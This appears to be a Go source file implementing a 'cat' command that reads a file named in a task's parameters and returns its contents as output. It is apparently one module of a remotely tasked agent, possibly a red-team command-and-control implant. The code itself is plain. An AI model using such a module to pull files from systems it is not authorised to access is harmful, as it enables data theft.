package commands

import (
	"fmt"
	"os"

	"fawkes/pkg/structs"
)

// CatCommand implements the cat command
type CatCommand struct{}

// Name returns the command name
func (c *CatCommand) Name() string {
	return "cat"
}

// Description returns the command description
func (c *CatCommand) Description() string {
	return "Display file contents - reads and displays the contents of a file"
}

// Execute executes the cat command
func (c *CatCommand) Execute(task structs.Task) structs.CommandResult {
	// Check if parameters are provided
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: No file path specified",
			Status:    "error",
			Completed: true,
		}
	}

	// Strip surrounding quotes in case the user wrapped the path (e.g. "C:\Program Data\file.txt")
	path := stripPathQuotes(task.Params)

	// Read the file
	content, err := os.ReadFile(path)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading file: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Return the file contents
	return structs.CommandResult{
		Output:    string(content),
		Status:    "success",
		Completed: true,
	}
}
